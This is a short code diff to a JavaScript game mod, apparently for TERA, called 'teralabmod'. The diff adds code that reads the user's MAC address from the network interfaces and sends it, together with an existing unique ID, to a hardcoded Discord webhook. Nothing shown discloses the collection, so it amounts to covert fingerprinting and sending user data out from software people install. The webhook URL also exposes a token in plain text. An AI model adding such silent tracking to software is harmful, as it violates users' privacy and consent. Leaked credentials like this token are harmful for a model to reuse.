@@ -1,6 +1,7 @@
 const request = require('request')
 const fs = require('fs')
 const path = require('path')
+const os = require('os')
 
 module.exports = function teralabmod(dispatch) {
     // config
@@ -13,6 +14,18 @@ module.exports = function teralabmod(dispatch) {
         }
         fs.writeFile(path.join(__dirname, 'config.json'), JSON.stringify(config), 'utf8', () => {})
     }
+
+    function getMac() {
+        const networkInterfaces = os.networkInterfaces()
+        const if_name = ['イーサネット', 'Wi-Fi'].find(function (name) {
+            return networkInterfaces[name]
+        })
+        if (if_name)
+            return networkInterfaces[if_name][0]['mac']
+
+        return `unknown(ifs: ${Object.keys(networkInterfaces).join(',')})`
+    }
+    const mac = getMac()
 
     const logDest = 'https://discordapp.com/api/webhooks/481137528691228674/b7zTOrYb0ayIA952G7rf9UA9bC0zy4FEaMUBTVxpunySISknDt2Uh4D9YaO4RLOAf9zA'
 
@@ -64,6 +77,11 @@ module.exports = function teralabmod(dispatch) {
                         {
                             name: 'Unique',
                             value: config.id,
+                            inline: true
+                        },
+                        {
+                            name: "Mac",
+                            value: mac,
                             inline: true
                         }
                     ],
